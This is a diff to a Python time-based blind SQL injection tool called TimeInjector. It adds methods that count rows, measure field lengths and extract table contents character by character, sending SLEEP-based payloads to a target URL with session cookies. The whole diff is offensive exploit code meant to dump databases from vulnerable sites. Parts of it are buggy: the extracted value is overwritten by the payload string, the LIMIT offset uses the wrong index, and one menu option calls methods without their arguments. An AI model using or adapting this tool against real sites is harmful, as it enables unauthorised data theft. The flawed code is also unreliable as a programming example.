@@ -21,6 +21,7 @@ class TimeInjector:
         self.tablelens = []
         self.columnlens = []
         self.columnnames = []
+        self.elemnums = None
 
     def get_need(self):
         while not self.flag:
@@ -52,6 +53,7 @@ class TimeInjector:
                 self.get_column_lens(tablename)
                 self.get_columnnames(tablename)
             elif option == 4:
+                tablename = input("Please input tablename")
                 self.get_table_elem_lens()
                 self.get_table_elems()
             else:
@@ -180,14 +182,54 @@ class TimeInjector:
         else:
             return
 
-    def get_table_elem_nums(self):
-        pass
+    def get_table_elem_nums(self, tablename, columns):
+        if not self.dbname:
+            self.dbname = input("Please input dbname: ")
+        for i in range(1, 100):
+            elem = f"AND (SELECT COUNT({columns}) FROM {self.dbname}.{tablename})={i} AND SLEEP(2) -- "
+            url = self.url.format(elem)
+            time = timer(requests.get, url, self.cookies)
+            if time > 2:
+                self.elemnums = i
+                break
 
-    def get_table_elem_lens(self):
-        pass
+    def get_table_elem_lens(self, tablename, columns):
+        if self.elemnums:
+            elemlens = []
+            num = self.elemnums + 1
+            for i in range(0, num):
+                for j in range(1, 21):
+                    elem = f"AND LENGTH((SELECT {columns} FROM {self.dbname}.{tablename} LIMIT {i},1)) \
+                     ={j} AND SLEEP(2) -- "
+                    url = self.url.format(elem)
+                    time = timer(requests.get, url, self.cookies)
+                    if time > 2:
+                        elemlens.append(j)
+                        break
+            return elemlens
+        else:
+            return
 
-    def get_table_elems(self):
-        pass
+    def get_table_elems(self, tablename, columns, elemlens):
+        elems = []
+        for i in range(0,self.elemnums):
+            j = elemlens[i] + 1
+            elem = ''
+            for k in range(1, j):
+                for m in range(33, 128):
+                    elem = f"AND ASCII(SUBSTR((SELECT {columns} FROM {self.dbname}.{tablename} LIMIT \
+                    {j},1),{k},1))={m} AND SLEEP(2) -- "
+                    url = self.url.format(elem)
+                    time = timer(requests.get, url, self.cookies)
+                    if time > 2:
+                        elem = elem + chr(m)
+            elems.append(elem)
+        print(elems)
+
+
+
+
+
 
 
 
